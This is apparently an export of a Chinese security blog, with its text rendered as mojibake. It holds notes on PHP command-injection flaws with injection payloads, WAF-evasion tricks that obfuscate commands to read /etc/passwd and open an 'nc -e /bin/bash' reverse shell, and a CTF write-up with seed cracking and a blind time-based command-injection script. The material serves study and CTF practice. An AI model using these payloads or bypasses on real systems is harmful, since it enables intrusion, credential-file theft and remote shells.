<p>è¯­æ³•<br>mixed call_user_func ( callable parameter [, mixed $â€¦ ]] )<br>ç¬¬ä¸€ä¸ªå‚æ•° callback æ˜¯è¢«è°ƒç”¨çš„å›è°ƒå‡½æ•°ï¼Œå…¶ä½™å‚æ•°æ˜¯å›è°ƒå‡½æ•°çš„å‚æ•°ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">call_user_func($_GET[<span class="string">'a'</span>],$_GET[<span class="string">'b'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;oscommand&#x2F;1.php?a&#x3D;assert&amp;b&#x3D;phpinfo()</span><br></pre></td></tr></table></figure>

<h3 id="2-ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œæ¼æ´"><a href="#2-ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œæ¼æ´" class="headerlink" title="2.ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œæ¼æ´"></a>2.ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œæ¼æ´</h3><p>ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œçš„å‡½æ•°<br>system()<br>exec()<br>shell_exec()<br>passthru()<br>pcntl_exec()<br>popen()<br>proc_open()<br>åå¼•å·<br>â€¦</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $target = $_REQUEST[<span class="string">'ip'</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(php_uname(<span class="string">'s'</span>), <span class="string">'Windows NT'</span>)) &#123;</span><br><span class="line">        $cmd = shell_exec(<span class="string">'ping '</span> . $taeget);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;'</span>.$cmd.<span class="string">'&lt;/pre&gt;'</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $cmd = shell_exec(<span class="string">'ping -c 3 '</span> . $target);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;'</span>.$cmd.<span class="string">'&lt;/pre&gt;'</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>é¡µé¢é€šè¿‡requestè·å–ä¼ å…¥çš„ipå‚æ•°ï¼Œå¹¶è·å–å½“å‰ç³»ç»Ÿç±»å‹ä¹‹åæ‹¼æ¥ç›¸åº”å‘½ä»¤â€ping + target IPâ€å¹¶æ‰§è¡Œï¼Œåœ¨æ­¤è¿‡ç¨‹ä¸­IPå‚æ•°å¯æ§ï¼Œæ‰€ä»¥åœ¨IPå¯æ‹¼æ¥å‘½ä»¤ã€‚</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.0.1&amp;&amp;whoami</span><br><span class="line">127.0.0.1;whoami</span><br><span class="line">127.0.0.1||whoami</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>é€»è¾‘æ¼æ´</tag>
      </tags>
  </entry>
  <entry>
    <title>é€»è¾‘ç»•è¿‡WAF</title>
    <url>/2020/01/15/%E9%80%BB%E8%BE%91%E7%BB%95%E8%BF%87WAF/</url>
    <content><![CDATA[<h4 id="0X01-æŠ€å·§ä¸€-é€šé…ç¬¦"><a href="#0X01-æŠ€å·§ä¸€-é€šé…ç¬¦" class="headerlink" title="0X01 æŠ€å·§ä¸€:é€šé…ç¬¦"></a>0X01 æŠ€å·§ä¸€:é€šé…ç¬¦<a id="more"></a></h4><table>
<thead>
<tr>
<th>*****</th>
<th><strong>ä»£è¡¨(0ä¸ªåˆ°æ— ç©·å¤šä¸ª)ä»»æ„å­—ç¬¦</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>?</strong></td>
<td><strong>ä»£è¡¨(ä¸€å®šæœ‰ä¸€ä¸ª)ä»»æ„å­—ç¬¦</strong></td>
</tr>
<tr>
<td><strong>[ ]</strong></td>
<td><strong>åŒæ ·ä»£è¡¨ï¼ˆä¸€å®šæœ‰ä¸€ä¸ªåœ¨æ‹¬å·å†…ï¼‰çš„å­—ç¬¦ï¼Œä½†æ˜¯éä»»æ„å­—ç¬¦ã€‚</strong></td>
</tr>
<tr>
<td><strong>[ - ]</strong></td>
<td><strong>ä»£è¡¨åœ¨ç¼–ç é¡ºåºå†…çš„æ‰€æœ‰å­—ç¬¦ï¼Œ[0-9]ä»£è¡¨0åˆ°9ä¹‹é—´æ‰€æœ‰æ•°å­—ï¼Œå› ä¸ºæ•°å­—çš„è¯­ç³»ç¼–ç æ˜¯è¿ç»­çš„</strong></td>
</tr>
<tr>
<td><strong>[^ ]</strong></td>
<td><strong>è¡¨ç¤ºåå‘é€‰æ‹©ï¼Œ[â€˜^abcâ€™]è¡¨ç¤ºä¸€å®šæœ‰ä¸€ä¸ªå­—ç¬¦ï¼Œåªè¦æ˜¯éaï¼Œbï¼Œcå­—ç¬¦å°±æ¥å—</strong></td>
</tr>
</tbody></table>
<p>ä¾‹å­ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ls -l</span><br><span class="line">ä½¿ç”¨é€šé…ç¬¦</span><br><span class="line">&#x2F;?in&#x2F;?s -l</span><br><span class="line"></span><br><span class="line">è¯»å–&#x2F;etc&#x2F;passwdï¼š</span><br><span class="line">&#x2F;???&#x2F;??t &#x2F;??c&#x2F;p???w?</span><br><span class="line">æœ‰æ—¶å€™WAFä¸å…è®¸ä½¿ç”¨å¤ªå¤šçš„?å·</span><br><span class="line">&#x2F;?in&#x2F;cat &#x2F;?tc&#x2F;p?sswd</span><br><span class="line"></span><br><span class="line">NCåå¼¹shellï¼š</span><br><span class="line">nc -e &#x2F;bin&#x2F;bash 127.0.0.1 3737</span><br><span class="line">ä¸ºäº†é¿å…ç¬¦å·.æˆ‘ä»¬å¯ä»¥å°†IPåœ°å€è½¬æ¢æˆæ•´å‹ã€‚</span><br><span class="line">127.0.0.1 â†’ 2130706433</span><br><span class="line"></span><br><span class="line">ä½¿ç”¨é€šé…ç¬¦</span><br><span class="line"></span><br><span class="line">root@kali:~# &#x2F;??n&#x2F;?c -e &#x2F;??n&#x2F;b??h 2130706433 3737</span><br></pre></td></tr></table></figure>

<p>0X02 æŠ€å·§äºŒ:è¿æ¥ç¬¦</p>
<p>ç”¨å¼•å·,åæ–œæ é—­åˆï¼Œå¯ä»¥ç»•è¿‡ä¸€äº›åŒ¹é…å­—ç¬¦ä¸²çš„WAFè§„åˆ™.</p>
<p>è¯»å–/etc/passwdï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#39;b&#39;i&#39;n&#39;&#x2F;&#39;c&#39;a&#39;t&#39; &#x2F;&#39;e&#39;t&#39;c&#39;&#x2F;&#39;p&#39;a&#39;s&#39;s&#39;w&#39;d</span><br></pre></td></tr></table></figure>

<p>æ£€æµ‹NCï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#39;b&#39;i&#39;n&#39;&#x2F;&#39;w&#39;h&#39;i&#39;c&#39;h&#39; &#39;n&#39;c</span><br></pre></td></tr></table></figure>

<p>æ²¡æœ‰NCçš„æƒ…å†µæ£€æŸ¥wgetï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#39;b&#39;i&#39;n&#39;&#x2F;&#39;w&#39;h&#39;i&#39;c&#39;h&#39; &#39;w&#39;g&#39;e&#39;t</span><br></pre></td></tr></table></figure>

<p>å…¶ä»–å­—ç¬¦ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">åŒå¼•å·</span><br><span class="line">&#x2F;&quot;b&quot;i&quot;n&quot;&#x2F;&quot;w&quot;h&quot;i&quot;c&quot;h&quot; &quot;n&quot;c</span><br></pre></td></tr></table></figure>

<p>åæ–œæ† </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;b\i\n&#x2F;w\h\i\c\h n\c</span><br></pre></td></tr></table></figure>

<h2 id="0Ã—03-æŠ€å·§ä¸‰ï¼šæœªåˆå§‹åŒ–çš„bashå˜é‡"><a href="#0Ã—03-æŠ€å·§ä¸‰ï¼šæœªåˆå§‹åŒ–çš„bashå˜é‡" class="headerlink" title="0Ã—03 æŠ€å·§ä¸‰ï¼šæœªåˆå§‹åŒ–çš„bashå˜é‡"></a>0Ã—03 æŠ€å·§ä¸‰ï¼šæœªåˆå§‹åŒ–çš„bashå˜é‡</h2><p>åœ¨bashç¯å¢ƒä¸­å…è®¸æˆ‘ä»¬ä½¿ç”¨æœªåˆå§‹åŒ–çš„bashå˜é‡ï¼Œå¦‚ä½•</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$a,$b,$c</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬äº‹å…ˆå¹¶æ²¡æœ‰å®šä¹‰å®ƒä»¬ï¼Œè¾“å‡ºçœ‹çœ‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~# echo $a</span><br><span class="line"></span><br><span class="line">root@kali:~# echo $b</span><br><span class="line"></span><br><span class="line">root@kali:~# echo $c</span><br><span class="line"></span><br><span class="line">root@kali:~#</span><br></pre></td></tr></table></figure>

<p>æœªåˆå§‹åŒ–çš„å˜é‡å€¼éƒ½æ˜¯nullã€‚</p>
<p>è¯»å–/etc/passwdï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat$a &#x2F;etc$a&#x2F;passwd$a</span><br></pre></td></tr></table></figure>

<h3 id="IFSæ˜¯å†…éƒ¨å­—æ®µåˆ†éš”ç¬¦çš„ç¼©å†™ã€‚å®ƒå†³å®šBashè§£æå­—ç¬¦ä¸²æ—¶å°†æ€æ ·è¯†åˆ«å­—æ®µï¼Œæˆ–å•è¯åˆ†ç•Œçº¿ã€‚é»˜è®¤ä¸ºï¼ˆç©ºæ ¼ã€åˆ¶è¡¨ç¬¦ã€æ¢å·ï¼‰"><a href="#IFSæ˜¯å†…éƒ¨å­—æ®µåˆ†éš”ç¬¦çš„ç¼©å†™ã€‚å®ƒå†³å®šBashè§£æå­—ç¬¦ä¸²æ—¶å°†æ€æ ·è¯†åˆ«å­—æ®µï¼Œæˆ–å•è¯åˆ†ç•Œçº¿ã€‚é»˜è®¤ä¸ºï¼ˆç©ºæ ¼ã€åˆ¶è¡¨ç¬¦ã€æ¢å·ï¼‰" class="headerlink" title="$IFSæ˜¯å†…éƒ¨å­—æ®µåˆ†éš”ç¬¦çš„ç¼©å†™ã€‚å®ƒå†³å®šBashè§£æå­—ç¬¦ä¸²æ—¶å°†æ€æ ·è¯†åˆ«å­—æ®µï¼Œæˆ–å•è¯åˆ†ç•Œçº¿ã€‚é»˜è®¤ä¸ºï¼ˆç©ºæ ¼ã€åˆ¶è¡¨ç¬¦ã€æ¢å·ï¼‰"></a><strong>$IFSæ˜¯å†…éƒ¨å­—æ®µåˆ†éš”ç¬¦çš„ç¼©å†™ã€‚å®ƒå†³å®šBashè§£æå­—ç¬¦ä¸²æ—¶å°†æ€æ ·è¯†åˆ«å­—æ®µï¼Œæˆ–å•è¯åˆ†ç•Œçº¿ã€‚é»˜è®¤ä¸ºï¼ˆç©ºæ ¼ã€åˆ¶è¡¨ç¬¦ã€æ¢å·ï¼‰</strong></h3>]]></content>
      <tags>
        <tag>ç»•è¿‡æŠ€å·§</tag>
      </tags>
  </entry>
  <entry>
    <title>é’“é±¼åŸæ¯</title>
    <url>/2020/08/27/%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AF/</url>
    <content><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€<a id="more"></a></h2><p>web pwnå¤ªé¡¶äº†orzï¼Œä¸ä¼šï¼Œè¿˜æœ‰ä¸€é¢˜æ ¹æœ¬æ²¡æ€è·¯â€¦</p>
<p>åªèƒ½è¯´è¿™æœ‰å¥–é‡‘çš„æ¯”èµ›pyå¾ˆä¸¥é‡ï¼Œæœ€å1åˆ†é’Ÿå›¢é˜Ÿç‹‚æ‰åæ¬¡â€¦</p>
<p>è‡ªå·±å¤ªèœäº†ï¼Œæ²¡å•¥è¾“å‡ºï¼Œæ‹–åè…¿äº†â€¦</p>
<h2 id="easyseed"><a href="#easyseed" class="headerlink" title="easyseed"></a><strong>easyseed</strong></h2><h3 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><ul>
<li>mt_rand</li>
<li>php_mt_randçˆ†ç ´ç§å­</li>
<li>XFF</li>
</ul>
<h3 id="è§£é¢˜æ­¥éª¤"><a href="#è§£é¢˜æ­¥éª¤" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h3><p>å¼€å§‹ä¸€ä¸ªå¼¹çª—ï¼Œæç¤ºä¸æ˜¯ä¸»äººï¼Œå¼€å§‹æ²¡åœ¨æ„ï¼Œåé¢åƒå¤§äºâ€¦</p>
<p>index.bak</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">*************************</span><br><span class="line">$lock &#x3D; random(6, &#39;abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ&#39;);</span><br><span class="line">$key &#x3D; random(16, &#39;1294567890abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ&#39;);</span><br><span class="line"></span><br><span class="line">function random($length, $chars &#x3D; &#39;0123456789ABC&#39;) &#123;</span><br><span class="line">    $hash &#x3D; &#39;&#39;;</span><br><span class="line">    $max &#x3D; strlen($chars) - 1;</span><br><span class="line">    for($i &#x3D; 0; $i &lt; $length; $i++) &#123;</span><br><span class="line">        $hash .&#x3D; $chars[mt_rand(0, $max)];</span><br><span class="line">    &#125;</span><br><span class="line">    return $hash;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¾ˆç†Ÿæ‚‰ï¼Œé¢˜ç›®æœ¬èº«ä¹Ÿè¯´äº†æ˜¯seedï¼Œå…ˆè½¬æ¢ä¸€ä¸‹ï¼Œå…¬é’¥åœ¨cookieç§å¯ä»¥çœ‹åˆ°</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *str1 = <span class="string">"abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ"</span>;</span><br><span class="line">    <span class="keyword">char</span> *str2 = <span class="string">"vEUHaY"</span>; <span class="comment">//å…¬é’¥</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(str2) ; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="built_in">strlen</span>(str1) ; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> ( str2[i] == str1[j] ) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"%d %d 0 %d "</span>, j, j, <span class="built_in">strlen</span>(str1)<span class="number">-1</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">#<span class="number">21</span> <span class="number">21</span> <span class="number">0</span> <span class="number">51</span> <span class="number">30</span> <span class="number">30</span> <span class="number">0</span> <span class="number">51</span> <span class="number">46</span> <span class="number">46</span> <span class="number">0</span> <span class="number">51</span> <span class="number">33</span> <span class="number">33</span> <span class="number">0</span> <span class="number">51</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">51</span> <span class="number">50</span> <span class="number">50</span> <span class="number">0</span> <span class="number">51</span></span><br></pre></td></tr></table></figure>

<p>å†ç”¨<code>php_mt_seed</code>è§£ä¸€ä¸‹å¾—åˆ°ç§å­</p>
<img src="/2020/08/27/%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AF/1.png" class="">

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	mt_srand(<span class="number">718225</span>);</span><br><span class="line">	$lock = random(<span class="number">6</span>, <span class="string">'abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ'</span>);</span><br><span class="line">	$key = random(<span class="number">16</span>, <span class="string">'1294567890abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ'</span>);</span><br><span class="line">	<span class="keyword">echo</span> $key;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line">	<span class="keyword">echo</span> $lock;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">random</span><span class="params">($length, $chars = <span class="string">'0123456789ABC'</span>)</span> </span>&#123;</span><br><span class="line">		$hash = <span class="string">''</span>;</span><br><span class="line">		$max = strlen($chars) - <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $length; $i++) &#123;</span><br><span class="line">			$hash .= $chars[mt_rand(<span class="number">0</span>, $max)];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> $hash;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>é‡æ–°ç”Ÿæˆkeyå€¼ï¼Œå†å»æ›¿æ¢ï¼Œä½†æ˜¯ä¸€ç›´æ²¡æœ‰ç”¨ï¼ŒåŸå› å°±åœ¨å¼€å§‹çš„æç¤ºï¼Œè¦ç”¨xff</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">'http://122.112.252.28:20001/'</span></span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">'key'</span>:<span class="string">'nRtqGR8mtd9ZOPyI'</span>,</span><br><span class="line">    <span class="string">'lock'</span>:<span class="string">'vEUHaY'</span></span><br><span class="line">&#125;</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'X-Forwarded-For'</span>:<span class="string">'127.0.0.1'</span></span><br><span class="line">&#125;</span><br><span class="line">req = requests.post(url=url,headers=headers,cookies=cookies)</span><br><span class="line">print(req.text)</span><br></pre></td></tr></table></figure>

<img src="/2020/08/27/%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AF/2.png" class="">

<h2 id="easyweb"><a href="#easyweb" class="headerlink" title="easyweb"></a><strong>easyweb</strong></h2><h3 id="çŸ¥è¯†ç‚¹-1"><a href="#çŸ¥è¯†ç‚¹-1" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><ul>
<li>æ— å›æ˜¾å‘½ä»¤æ³¨å…¥</li>
<li>ç›²æ³¨</li>
<li>linuxå¸¸ç”¨å‘½ä»¤â€”â€”cut</li>
</ul>
<h3 id="è§£é¢˜æ­¥éª¤-1"><a href="#è§£é¢˜æ­¥éª¤-1" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h3><p>å¼€é¢˜ä»€ä¹ˆéƒ½æ²¡æœ‰å°±ä¸€å¥è¯ï¼Œè€å¥—è·¯äº†ï¼ŒæŠ“ä¸ªåŒ…çœ‹ä¸€ä¸‹</p>
<img src="/2020/08/27/%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AF/3.png" class="">

<p>ç»è¿‡æµ‹è¯•å‘½ä»¤æ³¨å…¥æ— å›æ˜¾ï¼Œä¸çŸ¥é“åå¼¹shellè¡Œä¸è¡Œï¼Œæ²¡æœ‰è¯•ï¼Œé˜Ÿé‡Œå¸ˆå‚…ç”¨çš„ç›²æ³¨ï¼Œå°±ç”¨ç›²æ³¨å¥½äº†</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># import requests</span></span><br><span class="line"><span class="comment"># url = 'http://122.112.252.28:20001/'</span></span><br><span class="line"><span class="comment"># cookies = &#123;</span></span><br><span class="line"><span class="comment">#     'key':'nRtqGR8mtd9ZOPyI',</span></span><br><span class="line"><span class="comment">#     'lock':'vEUHaY'</span></span><br><span class="line"><span class="comment"># &#125;</span></span><br><span class="line"><span class="comment"># headers = &#123;</span></span><br><span class="line"><span class="comment">#     'X-Forwarded-For':'127.0.0.1'</span></span><br><span class="line"><span class="comment"># &#125;</span></span><br><span class="line"><span class="comment"># req = requests.post(url=url,headers=headers,cookies=cookies)</span></span><br><span class="line"><span class="comment"># print(req.text)</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">'http://119.3.37.185/'</span></span><br><span class="line">payload = <span class="string">'if [ `cut -c  &#123;num1&#125; /flag.txt` = "&#123;num2&#125;" ];then sleep 2;fi'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">400</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'cmd'</span>:payload.format(num1=str(i),num2=chr(j))</span><br><span class="line">        &#125;</span><br><span class="line">        start_time = time()</span><br><span class="line">        requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> time()-start_time&gt;<span class="number">2</span>:</span><br><span class="line">            flag += chr(j)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">if</span> chr(j) == <span class="string">'&#125;'</span>:</span><br><span class="line">                exit()</span><br></pre></td></tr></table></figure>

<img src="/2020/08/27/%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AF/4.png" class="">]]></content>
      <tags>
        <tag>dycb</tag>
      </tags>
  </entry>
</search>
